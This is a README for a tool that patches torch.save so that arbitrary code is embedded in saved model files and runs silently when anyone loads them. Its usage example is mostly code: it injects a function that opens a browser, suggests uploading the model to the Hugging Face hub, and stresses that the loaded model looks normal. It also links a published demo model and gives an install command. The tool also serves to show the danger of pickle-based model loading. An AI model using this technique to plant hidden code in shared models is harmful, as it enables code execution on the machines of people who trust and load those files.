# patch-torch-save
Patches the torch.save function with arbitrary code that gets executed upon torch.load.
Works well with the hugging face hub.

Try it out here: [https://huggingface.co/ykilcher/totally-harmless-model](https://huggingface.co/ykilcher/totally-harmless-model)

## Usage
```python
# save a model with injected code

import patch_torch_save
from transformers import AutoModel

def open_browser():
    import webbrowser
    webbrowser.open("https://www.patreon.com/yannickilcher")
    import sys
    del sys.modules["webbrowser"]
    del webbrowser

patched_save_function = patch_torch_save.patch_save_function(open_browser)

model = AutoModel.from_pretrained("distilbert-base-uncased")
model.save_pretrained("./local_folder", save_function=patched_save_function) # optionally, upload to HF hub


# later...

from transformers import AutoModel

model = AutoModel.from_pretrained("./local_folder") # or load from HF hub
print(model) # it's just a normal model... but check your browser

```

## Installation
```bash
pip install git+https://github.com/yk/patch-torch-save
```
